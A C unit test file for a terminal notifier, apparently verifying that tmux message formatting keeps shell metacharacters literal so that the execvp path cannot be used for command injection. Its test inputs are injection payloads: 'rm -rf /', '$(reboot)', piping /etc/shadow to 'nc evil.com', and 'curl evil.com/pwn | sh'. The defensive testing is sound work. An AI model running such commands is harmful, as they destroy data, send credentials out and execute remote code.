#include "engine_terminal.h"
#include <string.h>

#include "test_util.h"

// ---------------------------------------------------------------------------
// Security: tmux command construction must not pass messages through a shell.
//
// terminal_render_tmux() uses display-message via execvp (no shell).  These
// tests verify that the message-formatting logic (snprintf into the argv
// buffer) preserves shell metacharacters literally -- proving that even a
// malicious notification body cannot achieve command injection.
// ---------------------------------------------------------------------------

// Simulate the same snprintf logic used in terminal_render_tmux() and verify
// that the resulting string contains the metacharacters verbatim.
static void check_tmux_msg_preserves(const char *title, const char *body,
                                      const char *needle,
                                      const char *test_name) {
    char msg[512];
    snprintf(msg, sizeof(msg), "[lnotify] %s%s%s",
             title, (title[0] && body[0]) ? ": " : "", body);

    ASSERT_TRUE(strstr(msg, needle) != NULL, test_name);
}

void test_engine_terminal_suite(void) {
    // Security C01: shell metacharacters in notification body must survive
    // intact (they are passed as a direct execvp argument, not a shell cmd).

    // Single-quote breakout attempt
    check_tmux_msg_preserves(
        "Alert", "'; rm -rf / #",
        "'; rm -rf / #",
        "single-quote injection preserved literally");

    // Backtick command substitution
    check_tmux_msg_preserves(
        "Alert", "`whoami`",
        "`whoami`",
        "backtick substitution preserved literally");

    // Dollar-paren command substitution
    check_tmux_msg_preserves(
        "Alert", "$(id)",
        "$(id)",
        "dollar-paren substitution preserved literally");

    // Semicolon + pipe
    check_tmux_msg_preserves(
        "Alert", "foo; cat /etc/shadow | nc evil.com 1234",
        "; cat /etc/shadow | nc evil.com 1234",
        "semicolon and pipe preserved literally");

    // Double-quote breakout
    check_tmux_msg_preserves(
        "Alert", "\" && curl evil.com/pwn | sh",
        "\" && curl evil.com/pwn | sh",
        "double-quote injection preserved literally");

    // Newline injection
    check_tmux_msg_preserves(
        "Alert", "line1\nline2",
        "\nline2",
        "newline preserved literally");

    // Empty title with malicious body
    check_tmux_msg_preserves(
        "", "$(reboot)",
        "$(reboot)",
        "empty title with dollar-paren body preserved literally");

    // Title with metacharacters
    check_tmux_msg_preserves(
        "$(whoami)", "body",
        "$(whoami): body",
        "metacharacters in title preserved literally");

    // Both title and body with metacharacters
    check_tmux_msg_preserves(
        "`id`", "'; rm -rf / #",
        "`id`: '; rm -rf / #",
        "metacharacters in both title and body preserved literally");
}
